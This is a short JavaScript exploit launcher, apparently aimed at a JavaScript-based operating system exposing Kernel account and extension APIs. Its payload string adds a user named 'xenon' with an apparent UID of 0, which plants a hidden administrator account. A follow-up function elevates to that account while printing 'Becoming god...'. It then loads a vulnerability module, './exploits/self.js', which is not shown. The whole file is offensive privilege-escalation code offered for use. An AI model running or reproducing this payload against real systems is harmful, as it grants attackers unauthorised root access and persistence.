qb.enableRegularRequire();

const args = argv;
const input = args.shift();

const payload = `const ext = Kernel.extensions.get("users"); async function main(){ await ext.addUser("xenon", ["xenon"], 0, "xenon") }; main()`;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function postExec() {
  await sleep(200);

  input.stdout("Becoming god...\n");
  await Kernel.accounts.elevate("xenon", "xenon");

  input.stdout(`I am: ${JSON.stringify(Kernel.accounts.getCurrentInfo())}\n`);
}

switch (args[0]) {
  case "self": {
    require("./exploits/self.js");
    break;
  }

  default: {
    input.stdout("Did not specify vuln!\n");
    break;
  }
}